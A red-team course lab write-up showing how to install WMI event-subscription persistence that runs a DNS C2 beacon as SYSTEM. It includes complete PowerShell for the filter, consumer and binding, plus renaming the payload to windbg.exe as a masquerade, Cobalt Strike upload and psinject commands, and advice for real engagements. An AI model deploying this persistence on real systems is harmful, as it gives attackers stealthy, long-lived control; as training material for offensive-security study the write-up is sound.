# CRTO — Elevated Persistence Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Elevated Persistence
**Objective:** Install a persistent backdoor using a WMI event subscription that fires when Group Policy refreshes

---

## The Full Chain

```
Generate DNS Beacon payload (dns_x64.exe)
    ↓
Upload + rename to windbg.exe (masquerades as legitimate debugger)
    ↓
Import WmiPersistence.ps1 into Beacon
    ↓
psinject → run Add-WmiPersistence in Beacon process context
    ↓
WMI subscription created: EventFilter + Consumer + Binding
    ↓
gpupdate /force → fires Win32_NTLogEvent 1502 → WMI triggers
    ↓
windbg.exe (dns_x64.exe) executes as SYSTEM → DNS Beacon checks in
    ↓
Remove-WmiPersistence → cleanup
```

---

## Step 1 — Generate a DNS Payload

```
Payloads > Windows Stageless Payload
Listener: dns
Output:   Windows EXE
Save to:  C:\Payloads\dns_x64.exe
```

**Why DNS listener for persistence:**

| Listener | Why Used Here |
|---|---|
| HTTP | Requires direct HTTP egress — may be blocked or logged |
| DNS | Uses DNS queries for C2 — harder to block without breaking name resolution, survives network changes |
| SMB | Peer-to-peer only — not suitable for a standalone persistence trigger |

> DNS Beacons are slower (higher latency callbacks) but significantly more resilient for persistence scenarios — they survive reboots, network changes, and environments where HTTP egress is restricted.

---

## Step 2 — Stage the Payload

From the SYSTEM Beacon:

```bash
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe
```

**Why rename to `windbg.exe`:**
- `windbg.exe` is a legitimate Microsoft Windows Debugger binary
- The WMI consumer command line `C:\Windows\System32\windbg.exe -trace` looks like a normal debugging diagnostic invocation
- An analyst reviewing the WMI subscription sees a plausible system-level debugging task rather than an obvious payload name
- **MITRE:** T1036.005 — Masquerading: Match Legitimate Name or Location

> On real engagements, place the renamed payload in a path consistent with the masquerade — `C:\Windows\System32\` requires SYSTEM (which you have), and makes the path completely convincing.

---

## Step 3 — WMI Event Subscription

**TTP:** T1546.003 — Event Triggered Execution: Windows Management Instrumentation Event Subscription

WMI persistence consists of three components that must all be created and linked:

```
__EventFilter          → defines WHEN to trigger (the condition)
CommandLineEventConsumer → defines WHAT to run (the action)
__FilterToConsumerBinding → links filter to consumer
```

All three are stored in `root/subscription` namespace and persist across reboots — they live in the WMI repository (`C:\Windows\System32\wbem\Repository`), not the registry or filesystem.

### The Script

```powershell
# Save to C:\Tools\WmiPersistence.ps1

function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "Debug Trace"
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage = 'WQL'
   }

   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }

   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter = $Filter
      Consumer = $Consumer
   }

   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

### EventFilter Breakdown

```wql
SELECT * FROM __InstanceCreationEvent WITHIN 5
WHERE TargetInstance ISA 'Win32_NTLogEvent'
AND TargetInstance.EventCode = '1502'
```

| Component | Value | Meaning |
|---|---|---|
| `__InstanceCreationEvent` | — | Fires when a new WMI instance is created (i.e. a new log event appears) |
| `WITHIN 5` | 5 seconds | Polling interval — WMI checks for the condition every 5 seconds |
| `Win32_NTLogEvent` | — | Watches Windows Event Log entries |
| `EventCode = '1502'` | — | Event ID 1502 = Group Policy successfully applied — fires on every `gpupdate` |

> **Why Event ID 1502:** It's a reliable, predictable trigger that fires on every Group Policy refresh — which happens automatically every ~90 minutes on domain-joined machines. No user interaction required for recurring execution.

### Consumer Breakdown

```powershell
CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
```

`CommandLineEventConsumer` executes a command line when the filter fires. The command runs as **SYSTEM** in session 0 — the same context as the WMI service itself.

### Binding

The `__FilterToConsumerBinding` links the filter and consumer together. Without this, the filter and consumer exist independently but never interact.

---

## Step 4 — Install via psinject

```bash
# Import the script into Beacon's memory
powershell-import C:\Tools\WmiPersistence.ps1

# Inject and run Add-WmiPersistence in the Beacon process
psinject [BEACON_PID] x64 Add-WmiPersistence
```

**Why `psinject` instead of `powerpick`:**

| Command | Execution Context | Use When |
|---|---|---|
| `powerpick` | Runs in a spawned post-ex process | Standard in-memory PowerShell execution |
| `psinject` | Injects into a **specific existing process** by PID | When you need execution in a particular process context (e.g. SYSTEM process for WMI operations) |

> Using `psinject` with the SYSTEM Beacon PID ensures the WMI subscription is created with SYSTEM privileges — required for writing to `root/subscription`.

---

## Step 5 — Trigger and Verify

```bash
# Trigger Group Policy refresh → fires EventCode 1502 → WMI executes windbg.exe
execute gpupdate /target:computer /force
```

Expected result: New DNS Beacon appears within a few seconds running as SYSTEM.

> On a real engagement you wouldn't need to manually trigger this — the subscription fires automatically on the next scheduled Group Policy refresh (~90 minutes). Manual triggering is just for lab verification.

---

## Step 6 — Cleanup

```bash
psinject [BEACON_PID] x64 Remove-WmiPersistence
```

**What `Remove-WmiPersistence` deletes:**
- `__EventFilter` where `Name='Debug Trace'`
- `CommandLineEventConsumer` where `Name='Debug Consumer'`
- `__FilterToConsumerBinding` where path contains `Debug`

> Always remove all three components. Leaving a `FilterToConsumerBinding` with a dangling reference or an orphaned `__EventFilter` is detectable and can cause WMI instability.

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1546.003 | WMI Event Subscription | EventFilter + Consumer + Binding in root/subscription |
| T1036.005 | Masquerading: Match Legitimate Name | dns_x64.exe renamed to windbg.exe |
| T1071.004 | Application Layer Protocol: DNS | DNS Beacon for C2 callbacks |
| T1070 | Indicator Removal | Remove-WmiPersistence cleans all three WMI objects |

---

## Key Takeaways

- WMI subscriptions live in the **WMI repository**, not the registry or filesystem — most registry-focused persistence hunters miss them entirely
- All three objects (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`) must be created **and** bound — missing any one breaks the chain silently
- `WITHIN 5` is the polling interval — lower values mean faster triggering but more WMI overhead; 5 seconds is a reasonable balance
- Event ID 1502 is ideal as a trigger — fires automatically every ~90 minutes without user interaction on any domain-joined machine
- `psinject` into the SYSTEM Beacon PID is required — `powerpick` would run in a spawned process that may not have the right privilege context for `root/subscription` writes
- DNS listener is the right choice for persistence payloads — survives network changes and HTTP egress restrictions
- Always implement `Remove-WmiPersistence` before the engagement — cleanup is not optional
